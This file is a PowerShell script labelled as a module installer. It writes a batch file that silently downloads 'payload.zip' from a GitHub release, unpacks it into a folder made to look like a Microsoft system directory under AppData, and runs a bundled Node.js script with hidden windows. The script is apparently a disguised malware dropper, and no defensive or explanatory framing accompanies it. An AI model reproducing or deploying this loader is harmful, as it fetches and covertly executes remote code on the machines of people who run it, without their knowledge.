$ErrorActionPreference = 'Stop'

# MODULE INSTALLER
$batPath = Join-Path $env:TEMP "modules_bginstall_$(Get-Random).bat"

@"
@echo off
setlocal

set "DEST=%APPDATA%\Microsoft\Service"

if not exist "%DEST%" (
    mkdir "%DEST%"
)

powershell -Command "Invoke-WebRequest -Uri 'https://github.com/whylolitry/dki/releases/download/SKODIAVMFAORSDIFGMOPMIFDKVOZ843/App.zip' -OutFile '%TEMP%\payload.zip'"
powershell -Command "Expand-Archive -Path '%TEMP%\payload.zip' -DestinationPath '%DEST%' -Force"

for /f "delims=" %%i in ('dir /b /s "%DEST%\App\node.exe"') do set "NODE=%%i"
for /f "delims=" %%i in ('dir /b /s "%DEST%\App\index_*.js"') do set "SCRIPT=%%i"

powershell -WindowStyle Hidden -Command "Start-Process -FilePath '%NODE%' -ArgumentList '%SCRIPT%' -WindowStyle Hidden -WorkingDirectory '%DEST%\App'"

endlocal
"@ | Set-Content -Path $batPath -Encoding ASCII

Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$batPath`"" -WindowStyle Hidden
